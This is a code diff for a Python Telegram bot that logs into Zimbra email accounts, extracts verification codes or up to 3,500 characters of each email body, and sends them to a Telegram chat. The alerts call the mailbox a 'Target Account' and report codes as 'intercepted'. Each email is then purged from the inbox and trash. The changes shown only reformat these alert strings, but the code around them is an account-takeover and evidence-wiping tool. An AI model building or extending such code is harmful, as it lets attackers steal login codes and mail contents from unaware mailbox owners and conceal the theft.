@@ -114,6 +114,7 @@ def generate_main_keyboard_menu():
     markup.add(btn_protect, btn_check, btn_status, btn_stop)
     return markup
 
+
 # ==========================================
 # 3. BACKGROUND CORE SCRAPING & PURGE DAEMON
 # ==========================================
@@ -202,24 +203,34 @@ def zimbra_isolated_daemon_worker(chat_id, email, password):
                                     active_sessions[session_key]["codes_intercepted"] += 1
 
                             if secure_code:
-                                alert_payload = (
-                                    f"🚨 ⚡ **VINZY CODE INTERCEPTED** ⚡ 🚨\n\n"
-                                    f"👤 **Target Account:** `{email}`\n"
-                                    f"📝 **Context:** `{secure_context}`\n\n"
-                                    f"🔑 **EXTRACTED CODE:**\n"
-                                    f"```\n{secure_code}\n
-```\n"
-                                    f"🗑️ *Security Action: Email immediately stripped from Inbox and permanently deleted from trash.*"
-                                )
+                                alert_payload = f"""🚨 ⚡ **VINZY CODE INTERCEPTED** ⚡ 🚨
+
+👤 **Target Account:** `{email}`
+📝 **Context:** `{secure_context}`
+
+🔑 **EXTRACTED CODE:**
+
+```
+
+{secure_code}
+
+```
+🗑️ *Security Action: Email immediately stripped from Inbox and permanently deleted from trash.*"""
                             else:
-                                alert_payload = (
-                                    f"📩 **NEW INBOUND ZIMBRA TRANSMISSION LOGGED**\n\n"
-                                    f"👤 **Target Account:** `{email}`\n"
-                                    f"📝 **Log Status:** *System parameters did not match standard digits format. Relaying full content profile:* \n\n"
-                                    f"📋 **RAW EMAIL BODY CONTENT:**\n"
-                                    f"```\n{raw_extracted_text[:3500]}\n```\n\n"
-                                    f"🗑️ *Security Action: Content captured. Email stripped and purged.*"
-                                )
+                                alert_payload = f"""📩 **NEW INBOUND ZIMBRA TRANSMISSION LOGGED**
+
+👤 **Target Account:** `{email}`
+📝 **Log Status:** *System parameters did not match standard digits format. Relaying full content profile:*
+
+📋 **RAW EMAIL BODY CONTENT:**
+
+```
+
+{raw_extracted_text[:3500]}
+
+```
+
+🗑️ *Security Action: Content captured. Email stripped and purged.*"""
 
                             bot.send_message(chat_id, alert_payload, parse_mode="Markdown")
 
@@ -289,6 +300,7 @@ def zimbra_monitor_worker(chat_id, email, password):
         zimbra_isolated_daemon_worker(chat_id, email, password)
     except Exception as e:
         logging.critical(f"Uncaught failure state generated inside master worker execution thread: {e}")
+
 # ==========================================
 # 4. BOT ROUTING TELEGRAM EVENT HANDLERS
 # ==========================================
